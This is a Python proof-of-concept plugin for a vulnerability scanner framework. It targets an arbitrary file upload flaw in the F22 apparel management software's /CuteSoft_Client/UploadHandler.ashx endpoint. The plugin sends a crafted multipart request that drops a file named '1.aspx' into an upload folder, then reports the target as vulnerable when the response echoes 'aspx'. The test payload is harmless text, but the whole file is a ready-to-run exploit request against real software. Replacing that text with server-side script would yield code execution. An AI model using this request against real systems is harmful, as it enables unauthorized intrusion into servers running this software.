import requests
from xing.core.BasePlugin import BasePlugin
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "F22服装管理软件系统UploadHandler.ashx任意文件上传"
        self.app_name = 'F22服装管理软件系统'
        self.scheme = [SchemeType.HTTPS, SchemeType.HTTP]

    def verify(self, target):
        path = "/CuteSoft_Client/UploadHandler.ashx"
        url = target + path

        headers = {
            'Content-Type': 'multipart/form-data; boundary=----------398jnjVTTlDVXHlE7yYnfwBoix',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Accept-Encoding': 'gzip, deflate'
        }
        body = (
            "------------398jnjVTTlDVXHlE7yYnfwBoix\r\n"
            "Content-Disposition: form-data; name=\"folder\"\r\n"
            "\r\n"
            "/upload/udplog\r\n"
            "------------398jnjVTTlDVXHlE7yYnfwBoix\r\n"
            "Content-Disposition: form-data; name=\"Filedata\"; filename=\"1.aspx\"\r\n"
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "hello1234567\r\n"
            "------------398jnjVTTlDVXHlE7yYnfwBoix\r\n"
            "Content-Disposition: form-data; name=\"Upload\"\r\n"
            "\r\n"
            "Submit Query\r\n"
            "------------398jnjVTTlDVXHlE7yYnfwBoix--"
        )

        # 发送文件上传请求
        conn = requests.post(url, headers=headers, data=body)
        content = conn.content

        # 检查上传请求的响应
        if conn.status_code == 200 and b"aspx" in content:
            self.logger.success("发现漏洞, F22服装管理软件系统任意文件上传: {}".format(url))
            return url
        else:
            self.logger.debug("未发现漏洞")

        return None
